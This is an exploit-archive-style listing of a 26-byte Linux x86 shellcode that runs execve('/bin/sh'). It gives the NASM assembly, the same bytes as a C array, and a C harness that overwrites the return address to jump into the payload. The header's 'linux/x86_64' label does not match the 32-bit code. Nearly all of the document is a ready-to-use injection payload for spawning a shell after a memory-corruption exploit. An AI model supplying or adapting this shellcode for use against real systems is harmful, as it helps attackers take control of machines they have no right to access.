/*
; Title: Linux/x86 execve "/bin/sh" - shellcode 26 bytes
; Platform: linux/x86_64
; Date: 2015-05-19
; Author: Reza Behzadpour
; Simple ShellCode

	section .text
	global _start

	_start:

	xor  ecx,ecx
	mul  ecx

	;execve("/bin/sh", NULL, NULL)
	mov  al,11
	jmp  shell
	shell_ret:
	pop  ebx
	push ecx
	push ebx
	pop  ebx
	int  0x80

	shell:
	call shell_ret
	db  "/bin/sh"

*/

/*

# tcc -o ./shellcode ./shellcode.c
# uname -r
3.12-kali1-686-pae

*/

#include <stdio.h>
#include <string.h>

char shellcode[] = {
     "\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b"
     "\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff"
     "\xff\x2f\x62\x69\x6e\x2f\x73\x68"
};

int main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
	int *ret;
	ret = (int *) &ret + 2;
	(*ret) = (int) shellcode;

	return 0;
}